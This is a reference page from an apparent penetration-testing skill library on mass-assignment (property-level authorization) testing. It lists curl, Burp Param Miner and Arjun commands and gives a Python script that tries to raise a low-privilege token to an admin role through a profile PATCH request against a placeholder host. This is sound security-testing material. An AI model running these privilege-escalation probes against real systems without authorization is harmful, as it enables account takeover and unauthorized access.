# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`authorization-and-idor-property-level`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -si -X PATCH https://target.example/api/users/me -H 'Content-Type: application/json' -d '{"display_name":"x","role":"admin"}'` | Submit an extra privileged field alongside the legitimate update and read the result | Cross-platform |
| `Burp Param Miner` | `Run 'Guess JSON parameters' against the update endpoint` | Discover hidden writable fields such as role or balance the binder accepts | Cross-platform |
| `Arjun` | `arjun -u https://target.example/api/users/me -m JSON` | Mine accepted body parameters to find bindable privileged keys | Cross-platform |

## Minimal Script Shape

A mass-assignment differential: it updates the profile with and without an extra role field, then reports over-binding when the privileged field reads back changed.

```python
import json
import urllib.error
import urllib.request

ROUTE = "https://target.example/api/users/me"

def patch(payload, token):
    data = json.dumps(payload).encode()
    req = urllib.request.Request(ROUTE, data=data, method="PATCH",
                                 headers={"Authorization": "Bearer " + token,
                                          "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return json.loads(resp.read())
    except urllib.error.HTTPError as exc:
        return {"status": exc.code}

token = "<low-priv-token>"
before = patch({"display_name": "probe"}, token)
after = patch({"display_name": "probe", "role": "admin"}, token)
print({"before_role": before.get("role"), "after_role": after.get("role"),
       "mass_assignment": after.get("role") == "admin"})
```
